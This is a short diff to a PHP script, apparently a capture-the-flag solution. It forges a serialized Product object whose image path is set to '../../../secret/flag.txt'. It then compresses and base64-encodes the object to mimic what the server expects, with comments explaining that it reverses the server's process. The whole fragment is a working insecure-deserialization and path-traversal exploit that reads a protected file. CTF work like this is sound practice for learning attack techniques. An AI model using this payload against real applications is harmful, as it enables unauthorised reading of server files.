@@ -17,6 +17,8 @@ class Product {
 	}
 }
 
+# as a picture of the product we put our desired file
 $modified_product = new Product(99, "nice_product", "nice_product", "../../../secret/flag.txt", 99);
 
+# basically reversing the proces the server does
 echo base64_encode(gzcompress(serialize($modified_product)));
